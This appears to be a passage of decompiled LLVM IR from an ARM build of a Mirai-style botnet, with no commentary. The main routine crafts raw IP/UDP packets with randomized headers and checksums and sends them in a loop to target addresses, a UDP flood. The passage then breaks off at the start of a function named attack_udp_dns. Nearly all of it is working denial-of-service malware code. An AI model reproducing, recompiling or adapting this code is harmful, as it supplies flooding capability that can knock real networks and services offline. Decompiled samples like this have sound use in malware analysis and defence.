  %v5_be48 = inttoptr i32 %v0_be40 to i32*
  %v6_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v5_be48, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v6_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 25)
  %v3_be7c = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, 65280
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_24f80.59 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_24f80.59, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v9_c060 = icmp eq i32 %v3_bed8, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v9_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, 65280
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v5_c150 = call i32 @llvm.bswap.i32(i32 %v0_c134)
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v3_bed8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
